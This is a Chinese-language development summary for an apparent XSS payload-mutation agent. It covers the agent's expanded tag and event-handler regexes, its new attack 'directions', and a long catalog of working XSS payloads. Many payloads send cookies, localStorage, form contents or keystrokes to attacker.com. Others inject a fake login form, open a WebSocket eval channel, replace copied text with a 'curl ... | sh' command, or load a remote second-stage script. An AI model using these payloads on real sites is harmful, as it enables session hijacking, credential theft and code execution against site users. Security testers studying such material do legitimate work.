# XSS 语义迭代 Agent 增强总结

## 问题描述

在 XSS 类 payload 迭代中，使用像 `<video><source onerror=alert(document.domain)></video>` 这样的 payload 时，页面会弹窗提示"无法可靠识别 XSS 标签结构"。

## 根本原因

XSS parser 中的标签识别正则表达式 `_XSS_TAG_RE` 只包含了有限的几个 HTML 标签：
```python
# 旧版本 - 只支持 10 个标签
_XSS_TAG_RE = re.compile(r"<(script|img|svg|body|input|details|marquee|iframe|a|keygen|math)", re.IGNORECASE)
```

而 `<video>` 和 `<source>` 等 HTML5 标签不在白名单中，导致 parser 无法识别。

## 解决方案

### 1. 扩展 XSS 标签识别 (parser.py)

**文件**: `backend/src/app/semantic_agent/parts/parser.py`

扩展了 `_XSS_TAG_RE` 正则表达式，新增支持 24+ 个 HTML 标签：

```python
_XSS_TAG_RE = re.compile(
    r"<(script|img|svg|body|input|details|marquee|iframe|a|keygen|math|"
    r"video|audio|source|embed|object|form|isindex|base|link|meta|style|"
    r"div|span|p|h1|h2|h3|table|td|tr|select|textarea|button|label)",
    re.IGNORECASE
)
```

**新增支持的标签**：
- HTML5 媒体标签：`video`, `audio`, `source`
- 嵌入对象标签：`embed`, `object`
- 表单相关标签：`form`, `isindex`, `select`, `textarea`, `button`, `label`
- 文档结构标签：`base`, `link`, `meta`, `style`
- 布局标签：`div`, `span`, `p`, `h1`, `h2`, `h3`, `table`, `td`, `tr`

### 2. 扩展事件处理器识别 (parser.py)

**文件**: `backend/src/app/semantic_agent/parts/parser.py`

扩展了 `_XSS_EVENT_RE` 正则表达式，新增支持 50+ 个事件处理器：

```python
_XSS_EVENT_RE = re.compile(
    r"\b(onerror|onload|onfocus|ontoggle|onstart|onclick|onmouseover|"
    r"onmousedown|onmouseup|onmousemove|onmouseenter|onmouseleave|"
    r"ondblclick|oncontextmenu|onkeydown|onkeyup|onkeypress|"
    r"onsubmit|onchange|oninput|onpaste|oncopy|oncut|"
    r"onbeforeunload|onhashchange|onpageshow|onpagehide|"
    r"onanimationstart|onanimationend|ontransitionend|"
    r"onpointerover|onpointerenter|onpointerdown|onpointerup|"
    r"onseeking|onseeked|oncanplay|oncanplaythrough|ontimeupdate|"
    r"onended|onabort|onstalled|onsuspend|onwaiting|ondurationchange|"
    r"onloadstart|onloadedmetadata|onloadeddata|onprogress|onplay|onpause|"
    r"onvolumechange|onratechange|onauxclick|onwheel|onscroll|onresize|"
    r"onsearch|ontoggle|onshow|oninvalid|onreset|onselect|onselectstart|"
    r"onselectionchange|ondrag|ondragstart|ondragend|ondragover|ondragenter|"
    r"ondragleave|ondrop|onbeforecopy|onbeforecut|onbeforepaste|"
    r"onafterprint|onbeforeprint|onmessage|onmessageerror|ononline|onoffline|"
    r"onpopstate|onstorage|onunhandledrejection|onrejectionhandled)\b",
    re.IGNORECASE
)
```

**新增事件类别**：
- 鼠标事件：`onmousedown`, `onmouseup`, `onmousemove`, `onmouseenter`, `onmouseleave`, `ondblclick`, `oncontextmenu`
- 键盘事件：`onkeydown`, `onkeyup`, `onkeypress`
- 表单事件：`onsubmit`, `onchange`, `oninput`, `onpaste`, `oncopy`, `oncut`, `onreset`, `onselect`
- 页面事件：`onbeforeunload`, `onhashchange`, `onpageshow`, `onpagehide`, `onresize`, `onscroll`
- 动画事件：`onanimationstart`, `onanimationend`, `ontransitionend`
- 指针事件：`onpointerover`, `onpointerenter`, `onpointerdown`, `onpointerup`
- 媒体事件：`onseeking`, `onseeked`, `oncanplay`, `oncanplaythrough`, `ontimeupdate`, `onended`, `onabort`, `onstalled`, `onsuspend`, `onwaiting`, `ondurationchange`, `onloadstart`, `onloadedmetadata`, `onloadeddata`, `onprogress`, `onplay`, `onpause`, `onvolumechange`, `onratechange`
- 拖拽事件：`ondrag`, `ondragstart`, `ondragend`, `ondragover`, `ondragenter`, `ondragleave`, `ondrop`
- 其他：`onwheel`, `onauxclick`, `onsearch`, `onshow`, `oninvalid`, `onselectstart`, `onselectionchange`, `onbeforecopy`, `onbeforecut`, `onbeforepaste`, `onafterprint`, `onbeforeprint`, `onmessage`, `onmessageerror`, `ononline`, `onoffline`, `onpopstate`, `onstorage`, `onunhandledrejection`, `onrejectionhandled`

### 3. 更新变异方向 (directions.py)

**文件**: `backend/src/app/semantic_agent/parts/directions.py`

新增 8 个变异方向：

```python
XSS_DIRECTIONS: list[dict[str, str]] = [
    # ... 原有方向 ...
    
    # 新增方向：
    {"id":"part:expression-data-exfil","label":"数据窃取表达式","reason":"用数据窃取表达式替换简单弹窗（alert(1)→fetch('http://attacker.com/?c='+document.cookie)→navigator.sendBeacon(...)）"},
    {"id":"part:nested-tags","label":"嵌套标签组合","reason":"使用嵌套标签触发 XSS（<video><source onerror=...>、<svg><animate onbegin=...>）"},
    {"id":"part:media-events","label":"媒体事件利用","reason":"使用 HTML5 媒体标签的丰富事件（onloadstart、oncanplay、ontimeupdate、onseeking、ondurationchange）"},
    {"id":"part:cookie-theft","label":"Cookie 窃取","reason":"构造 Cookie 窃取 payload（document.cookie 外传）"},
    {"id":"part:storage-theft","label":"Storage 窃取","reason":"构造 localStorage/sessionStorage 窃取 payload"},
    {"id":"part:keylogger","label":"键盘记录","reason":"注入键盘记录器监听用户输入"},
    {"id":"part:dom-manipulation","label":"DOM 篡改","reason":"篡改页面 DOM 结构或内容"},
    {"id":"part:phishing-injection","label":"钓鱼页面注入","reason":"注入伪造登录表单窃取凭据"},
]
```

### 4. 增强 XSS 变异技术库 (xss_mutation.md)

**文件**: `backend/src/app/semantic_agent/skill/xss_mutation.md`

新增了以下内容：

#### 新增变异技术

**技术 8：嵌套标签与自闭合**
- 利用嵌套标签或自闭合标签触发事件
- 示例：`<video><source onerror=alert(1)>`, `<svg><animate onbegin=alert(1)>`

**技术 9：HTML5 媒体标签事件链**
- 利用 HTML5 媒体标签的丰富事件模型
- 示例：`<video onloadstart=alert(1)><source>`, `<audio oncanplay=alert(1) src=x>`

#### 高级攻击 Payload 目录

##### 1. 窃取敏感数据类

**Cookie 窃取**
```html
<img src=x onerror=fetch('http://attacker.com/?c='+document.cookie)>
<svg onload=new Image().src='http://attacker.com/?c='+document.cookie>
<script>navigator.sendBeacon('http://attacker.com',document.cookie)</script>
```

**LocalStorage/SessionStorage 窃取**
```html
<img src=x onerror=fetch('http://attacker.com/?d='+localStorage.getItem('token'))>
<svg onload=fetch('http://attacker.com',{method:'POST',body:JSON.stringify({ls:localStorage,ss:sessionStorage})})>
```

**表单数据窃取**
```html
<img src=x onerror="Array.from(document.forms).forEach(f=>fetch('http://attacker.com',{method:'POST',body:new FormData(f)}))">
```

**键盘记录器**
```html
<img src=x onerror="document.onkeypress=e=>fetch('http://attacker.com/?k='+e.key)">
<svg onload="document.addEventListener('keydown',e=>navigator.sendBeacon('http://attacker.com',e.key))">
```

##### 2. 页面操作类

**钓鱼页面注入**
```html
<img src=x onerror="document.body.innerHTML='<form action=http://attacker.com method=POST><input name=user placeholder=Username><input name=pass type=password placeholder=Password><button>Login</button></form>'">
```

**页面重定向**
```html
<img src=x onerror=location='http://attacker.com'>
<svg onload=window.location.href='http://attacker.com'>
```

**DOM 篡改**
```html
<img src=x onerror="document.querySelector('.price').innerText='$0.01'">
<svg onload="document.querySelector('.admin-link').style.display='block'">
```

##### 3. 持久化与隐蔽类

**Service Worker 注入**
```html
<img src=x onerror="navigator.serviceWorker.register('data:application/javascript,self.onfetch=e=>e.respondWith(fetch(`http://attacker.com/log?url=${e.request.url}`).then(()=>fetch(e.request)))').catch(e=>0)">
```

**WebSocket 反向 Shell**
```html
<img src=x onerror="ws=new WebSocket('ws://attacker.com');ws.onmessage=e=>eval(e.data)">
```

##### 4. 冷门技术类

**CSS Injection 转 XSS**
```html
<style>*{background:url('http://attacker.com/?css=leak')}</style>
```

**SVG 动画触发**
```html
<svg><animate attributeName=x dur=1s repeatCount=indefinite onbegin=alert(1) />
<svg><set attributeName=x to=0 onbegin=alert(document.domain) />
```

**WebRTC 本地 IP 泄露**
```html
<img src=x onerror="pc=new RTCPeerConnection({iceServers:[]});pc.createDataChannel('');pc.createOffer().then(o=>pc.setLocalDescription(o));pc.onicecandidate=e=>e.candidate?fetch('http://attacker.com/?ip='+e.candidate.candidate):0">
```

**Mutation Observer 监听**
```html
<img src=x onerror="new MutationObserver(m=>m.forEach(e=>fetch('http://attacker.com',{method:'POST',body:JSON.stringify({type:e.type,target:e.target.outerHTML})}))).observe(document,{childList:true,subtree:true,attributes:true})">
```

**剪贴板劫持**
```html
<img src=x onerror="document.addEventListener('copy',e=>{e.clipboardData.setData('text/plain','curl http://attacker.com/mal.sh|sh');e.preventDefault()})">
```

**Beacon API 隐蔽外传**
```html
<img src=x onerror="navigator.sendBeacon('http://attacker.com',new Blob([JSON.stringify({cookie:document.cookie,localStorage:localStorage,sessionStorage:sessionStorage,dom:document.documentElement.outerHTML})],{type:'application/json'}))">
```

**Prototype Pollution XSS**
```html
<img src=x onerror="Object.prototype.src='x';Object.prototype.onerror=alert(1);document.createElement('img')">
```

**Data URI Scheme**
```html
<iframe src="data:text/html,<script>alert(parent.document.cookie)</script>">
<embed src="data:text/html,<img src=x onerror=alert(document.domain)>">
```

**多阶段 Payload**
```html
<!-- Stage 1: 加载器 -->
<img src=x onerror="s=document.createElement('script');s.src='http://attacker.com/stage2.js';document.body.appendChild(s)">
```

**利用 CORS 错误配置**
```html
<img src=x onerror="fetch('http://victim.com/api/user',{credentials:'include'}).then(r=>r.json()).then(d=>fetch('http://attacker.com',{method:'POST',body:JSON.stringify(d)}))">
```

## 测试结果

### 测试用例

以下 payload 均能正常识别和解析：

1. ✅ `<video><source onerror=alert(document.domain)></video>` (置信度: 0.83)
2. ✅ `<audio oncanplay=alert(1) src=x>` (置信度: 0.783)
3. ✅ `<img src=x onerror=fetch("http://attacker.com/?c="+document.cookie)>` (置信度: 0.783)
4. ✅ `<svg onload=navigator.sendBeacon("http://attacker.com",document.cookie)>` (置信度: 0.783)
5. ✅ `<iframe srcdoc="<script>alert(parent.document.cookie)</script>">` (置信度: 0.812)
6. ✅ `<details open ontoggle=alert(document.domain)>` (置信度: 0.783)
7. ✅ `<input autofocus onfocus=alert(localStorage.getItem("token"))>` (置信度: 0.783)

### 可用变异方向

每个 payload 现在都能提供 16 个变异方向，包括：
- 标签替换
- 事件处理器替换
- JS 表达式重写
- 数据窃取表达式
- 闭合结构变换
- 文本间距变换
- 命名空间替换
- 嵌套标签组合
- 媒体事件利用
- Cookie 窃取
- Storage 窃取
- 键盘记录
- DOM 篡改
- 钓鱼页面注入
- XSS 技术组合
- 属性边界变换

## 影响范围

### 修改的文件

1. `backend/src/app/semantic_agent/parts/parser.py` - XSS parser 核心逻辑
2. `backend/src/app/semantic_agent/parts/directions.py` - 变异方向定义
3. `backend/src/app/semantic_agent/skill/xss_mutation.md` - XSS 变异技术文档

### 向后兼容性

✅ 完全向后兼容 - 所有原有的 XSS payload 仍然能正常工作，只是新增了更多支持的标签和事件。

## 总结

此次增强解决了 XSS 语义迭代 agent 无法识别 HTML5 标签（如 video、audio、source）的问题，并大幅扩展了：

1. **标签支持**：从 10 个扩展到 34+ 个 HTML 标签
2. **事件支持**：从 7 个扩展到 60+ 个事件处理器
3. **变异方向**：新增 8 个高级攻击方向
4. **攻击技术**：新增 20+ 种高级攻击 payload 示例，涵盖：
   - 数据窃取（Cookie、Storage、表单、键盘记录）
   - 页面操作（钓鱼、重定向、DOM 篡改）
   - 持久化（Service Worker、WebSocket）
   - 冷门技术（CSS Injection、SVG 动画、WebRTC、Prototype Pollution 等）

现在 XSS 语义迭代 agent 能够识别和变异更广泛的 XSS payload，包括各种冷门和高级攻击技术。
